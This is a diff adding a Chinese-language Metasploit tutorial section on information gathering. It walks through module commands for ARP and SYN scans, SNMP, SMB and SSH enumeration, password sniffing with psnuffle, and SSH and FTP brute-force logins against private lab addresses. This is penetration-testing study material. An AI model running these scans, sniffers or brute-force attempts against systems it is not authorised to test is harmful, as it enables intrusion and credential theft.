@@ -74,3 +74,142 @@ msfconsole
 
 ### 凭证后端命令
 - creds 列出数据库中的所有凭据
+
+## Metasploit 渗透测试之信息收集
+
+### 基于 tcp 协议收集主机信息
+
+- 用 Metasploit 中的 nmap 和 arp_sweep 收集主机信息
+```shell
+db_nmap -sV 192.168.1.1
+
+# ARP 扫描
+use auxiliary/scanner/discovery/arp_sweep
+# 查看一下模块需要配置哪些参数
+show options
+# 配置 RHOSTS（扫描的目标网络）即可
+set RHOSTS 192.168.1.0/24
+# SHOST 和 SMAC 是伪造源 IP 和 MAC 地址使用的
+# 配置线程数
+set THREADS 30
+run
+#退出一下
+back
+```
+- 使用半连接方式扫描 TCP 端口
+```shell
+search portscan
+use auxiliary/scanner/portscan/syn
+# 查看配置项
+show options
+# 设置扫描的目标
+set RHOSTS 192.168.1.1
+# 置端口范围使用逗号隔开
+set PORTS 80
+# 设置线程数
+set THREADS 20
+run
+```
+- 使用 auxiliary /sniffer 下的 psnuffle 模块进行密码嗅探
+```shell
+search psnuffle
+use auxiliary/sniffer/psnuffle
+# 查看 psnuffle 的模块作用：
+info
+#这个 psnuffle 模块可以像以前的 dsniff 命令一样，去嗅探密码，只支持 pop3、imap、ftp、HTTP GET 协议。
+show options
+run
+```
+
+### 基于 SNMP 协议收集主机信息
+```shell
+# 实战-使用 snmp_enum 模块通过 snmp 协议扫描目标服务器信息
+use auxiliary/scanner/snmp/snmp_enum
+show options
+set RHOSTS 192.168.1.180
+run
+```
+
+### 基于 SMB 协议收集信息
+- 使用 smb_version 基于 SMB 协议扫描版本号
+```shell 
+use auxiliary/scanner/smb/smb_version
+# 设置扫描目标，注意多个目标使用逗号+空格隔开
+show options
+set RHOSTS 192.168.1.56, 192.168.1.180
+# 注： 192.168.1.56 后面的逗号和 192.168.1.180 之间是有空格的
+run
+```
+- 使用 smb_enumshares 基于 SMB 协议扫共享文件（账号、密码）
+```shell
+use auxiliary/scanner/smb/smb_enumshares
+show options
+# 扫描 192.168.1.53 到 192.168.1.60 的机器
+set RHOSTS 192.168.1.53-60
+# 如果你不配置用户，就扫描不到信息。配置一下用户信息，我这里用户是默认的管理员用户。
+set SMBUser administrator
+set SMBPass 123456
+run
+```
+- 使用 smb_lookupsid 扫描系统用户信息（SID 枚举）
+```shell
+# 注：SID 是 Windows 中每一个用户的 ID，更改用户名 SID 也是不会改变的。
+use auxiliary/scanner/smb/smb_lookupsid
+show options
+set RHOSTS 192.168.1.56
+set SMBUser administrator
+set SMBPass 123456
+run
+```
+
+### 基于 SSH 协议收集信息
+- 查看 ssh 服务的版本信息
+```shell
+use auxiliary/scanner/ssh/ssh_version
+show options
+set RHOSTS 192.168.1.180
+run
+```
+-  对 SSH 暴力破解
+```shell
+use auxiliary/scanner/ssh/ssh_login
+show options
+set RHOSTS 192.168.1.180
+# 设置字典文件默认的字典文件是不满足实际需求的后期我们使用更强大的字典文件。
+set USERPASS_FILE /usr/*/root_userpass.txt
+run
+# ssh 暴力破解成功后，会自动建立与目标机的连接
+# 查看已建立的连接
+sessions
+```
+
+### 基于 FTP 协议收集信息
+- 查看 ftp 服务的版本信息
+```shell
+# 加载 ftp 服务版本扫描模块
+use auxiliary/scanner/ftp/ftp_version
+# 查看设置参数
+show options
+# 设置目标 IP，可以设置多个
+set RHOSTS 192.168.1.180
+# 执行扫描，输入 exploit 或 run
+run
+# 扫描出 ftp 服务的版本号，我们可以尝试搜索版本号，看看有没有可以利用的模块
+search 2.3.4
+```
+- ftp 匿名登录扫描
+```shell
+use auxiliary/scanner/ftp/anonymous
+show options
+set RHOSTS 192.168.1.180
+run
+```
+- ftp 暴力破解
+```shell 
+use auxiliary/scanner/ftp/ftp_login
+show options
+set RHOSTS 192.168.1.180
+# 设置字典文件为默认的字典文件是不满足实际需求的，后期我们使用更强大的字典文件。
+set USERPASS_FILE /usr/*/root_userpass.txt
+run
+```
